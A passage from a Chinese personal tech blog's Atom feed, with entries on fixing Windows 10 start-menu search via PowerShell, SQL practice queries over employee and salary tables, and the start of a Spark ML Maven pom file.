      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>win10搜索栏失效</title>
    <link href="http://yoursite.com/2019/06/18/win10%E6%90%9C%E7%B4%A2%E6%A0%8F%E5%A4%B1%E6%95%88/"/>
    <id>http://yoursite.com/2019/06/18/win10搜索栏失效/</id>
    <published>2019-06-18T07:40:44.211Z</published>
    <updated>2019-05-09T18:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打开电脑突然发现，win10菜单的快速搜索APP功能失效了</p></blockquote><a id="more"></a> <p>稍微研究了一下，很简单，两步解决<br>第一步</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start powershell</span><br></pre></td></tr></table></figure><p>第二步，在弹出的新窗口中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppXPackage -Name Microsoft.Windows.Cortana | Foreach &#123;Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml"&#125;</span><br></pre></td></tr></table></figure><p>bingo！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;打开电脑突然发现，win10菜单的快速搜索APP功能失效了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="win10 bugs" scheme="http://yoursite.com/categories/Win/win10-bugs/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>SQL积累</title>
    <link href="http://yoursite.com/2019/06/18/SQL/"/>
    <id>http://yoursite.com/2019/06/18/SQL/</id>
    <published>2019-06-18T07:40:44.203Z</published>
    <updated>2019-06-12T08:50:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>SQL看似简单其实也包含了相当多的内容</p><p>慢慢积累吧，最近状态不咋好，一点点来</p><a id="more"></a> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找最晚入职员工的所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">--有个答案是</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">--但是这个答案有个问题，当一天由多个同事入职的时候会出现歧义</span></span><br><span class="line"><span class="comment">--所以用下面的方法是绝对正确的</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees <span class="keyword">where</span> hire_date = (<span class="keyword">select</span> <span class="keyword">max</span>(hire_date) <span class="keyword">from</span> employees)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找入职员工时间排名倒数第三的员工所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--LIMIT m,n : 表示从第m+1条开始，取n条数据；</span></span><br><span class="line"><span class="comment">--LIMIT n ： 表示从第0条开始，取n条数据，是limit(0,n)的缩写。</span></span><br><span class="line"><span class="comment">--考察点是limit的用法</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--与此同时还有一种想法觉得入职日期，只要是同一天的也就不分前后，也就是说，题目转换为了倒数三天前入职的所有同事。</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">    (<span class="keyword">select</span> <span class="keyword">distinct</span> hire_date </span><br><span class="line">     <span class="keyword">from</span> employees </span><br><span class="line">     <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">DESC</span> </span><br><span class="line">     <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">--同时考虑到distinct效率问题还可以改用group by</span></span><br><span class="line"><span class="comment">--经过测试，这种写法确实比上面的效率要高一点，同时应该要注意到这个应该和数据量也有关系</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">(<span class="keyword">select</span> hire_date</span><br><span class="line">    <span class="keyword">from</span> employees</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> hire_date</span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line">    <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找各个部门当前(to_date='9999-01-01')领导当前薪水详情以及其对应部门编号dept_no</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_manager`</span> (</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br><span class="line"><span class="comment">--要求输出格式：</span></span><br><span class="line"><span class="comment">--emp_nosalaryfrom_dateto_datedept_no</span></span><br><span class="line"><span class="comment">--答案一：先在两个表里用where过滤出现任的人选，然后用相等简单相等关联即可。</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.*, dm.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s,</span><br><span class="line">    dept_manager <span class="keyword">as</span> dm</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    dm.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    s.emp_no = dm.emp_no;</span><br><span class="line"><span class="comment">--答案二：</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.* , d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">    dept_manager <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    s.emp_no = d.emp_no</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    d.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="comment">--此题比较坑，限制了两个to_date，是因为薪水可能会变，人员也可能会变。</span></span><br><span class="line">然后两个表的前后位置不能动，否则和输出不符，姑且理解为必须小表<span class="keyword">join</span>大表吧。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有已经分配部门的员工的last_name和first_name</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="comment">--我首先考虑的是没有使用join的情况</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d, employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    d.emp_no = e.emp_no</span><br><span class="line"><span class="comment">--其实从效率方面考虑，使用join会不会好一点，好像使用自然连接不用on就可以</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">natural</span> <span class="keyword">join</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--下面这道还是类似的</span></span><br><span class="line"><span class="comment">--查找所有员工的last_name和first_name以及对应部门编号dept_no，也包括展示没有分配具体部门的员工</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    e.emp_no = d.emp_no</span><br><span class="line"><span class="comment">--简单的left join</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有员工入职时候的薪水情况，给出emp_no以及salary， 并按照emp_no进行逆序</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL看似简单其实也包含了相当多的内容&lt;/p&gt;
&lt;p&gt;慢慢积累吧，最近状态不咋好，一点点来&lt;/p&gt;
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Spark ML</title>
    <link href="http://yoursite.com/2019/06/18/SparkML/"/>
    <id>http://yoursite.com/2019/06/18/SparkML/</id>
    <published>2019-06-18T07:40:44.194Z</published>
    <updated>2019-05-23T08:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SparkML也是个大坑，先在这里贴上pom文件</p></blockquote><a id="more"></a> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>Akka repository<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.akka.io/releases<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/scala/<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>src/test/scala/<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.scala-tools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-scala-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 